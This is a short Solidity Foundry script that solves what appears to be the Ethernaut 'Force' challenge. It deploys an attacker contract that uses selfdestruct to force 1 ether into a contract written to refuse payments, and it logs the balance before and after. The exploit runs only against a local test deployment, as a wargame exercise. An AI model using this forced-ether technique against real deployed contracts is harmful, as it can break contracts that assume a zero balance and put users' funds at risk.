// SPDX-License-Identifier: MIT
pragma solidity >=0.8.10;

import "forge-std/Script.sol";
import "../src/Force.sol";

contract ForceHack is Script {
    Force public force;

    function run() public {
        force = new Force();
        ForceAttack attacker = new ForceAttack();
        vm.deal(address(attacker), 1 ether);
        console.log(
            "Before, Balance of Force contract:",
            address(force).balance
        );
        attacker.attack(payable(address(force)));
        console.log(
            "After, balance of Force contract:",
            address(force).balance
        );
    }
}

contract ForceAttack {
    function attack(address payable target) public {
        selfdestruct(target);
    }
}
